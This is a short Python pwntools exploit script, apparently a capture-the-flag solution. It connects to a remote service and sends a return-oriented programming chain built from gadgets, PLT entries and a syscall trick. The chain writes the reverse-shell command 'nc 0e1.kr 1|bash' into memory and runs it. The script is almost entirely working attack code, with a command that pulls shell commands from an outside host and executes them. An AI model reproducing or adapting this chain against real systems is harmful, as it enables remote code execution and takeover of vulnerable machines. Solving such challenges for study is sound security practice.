from pwn import *

HOST, PORT = "178.128.87.12", "31338"
# HOST, PORT = "192.168.137.139", 31337
r = remote(HOST, PORT)

ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[1]

# plts
alarm = 0x400520
puts  = 0x400510
syscall = 0x400530

# gadgets
poprdi = 0x400843
poprbxrbp = 0x4006fa
poprsir15 = 0x400841

set_eax = lambda x: p64(poprdi) + p64(x) + p64(alarm) + p64(alarm)

write = lambda src, addr: p64(poprdi) + p64(src) + p64(0x400660) + p64(poprbxrbp) + p64((addr-0x5d5bf445)&(2**64-1)) + p64(0) + p64(0x4006f6)
call = lambda sysno, rdi, rsi, rdx: p64(0x40083a) + p64(0) + p64(1) + p64(0x601028) + p64(rdx) + p64(rsi) + p64(rdi) + set_eax(sysno) + p64(0x400820)
call2 = lambda sysno, rdi, rsi, rdx: p64(0) + p64(0) + p64(2) + p64(0x601028) + p64(rdx) + p64(rsi) + p64(rdi) + set_eax(sysno) + p64(0x400820)

bss = 0x601800
t = 0x601030
t2 = 0x601020

addr = 0x41414141
value = 0x10000000

write8 = lambda addr, value: p64(poprdi) + p64(addr - 8) + p64(poprsir15) + p64(value) + p64(0) + p64(0x400540)

print `r.recvuntil('> ')`

payload = (
	p32(0x8A919FF0).ljust(128) + p64(1)
	+ write(0x4003ea, t + 0)
	+ write(0x400921, t + 1)
	+ write8(bss, u64('nc 0e1.k'))
	+ write8(bss + 8, u64('r 1|bash'))
	+ write(0x4003f9, t2 + 0)
	+ write(0x4000f1, t2 + 1)
	+ write(0x400291, t2 + 2)
	+ p64(0x40083c) + p64(bss) + p64(0) * 2
	+ p64(0x41414141) + p64(0x400520)
	)

# pause()
r.sendline(payload)
print `r.recvall()`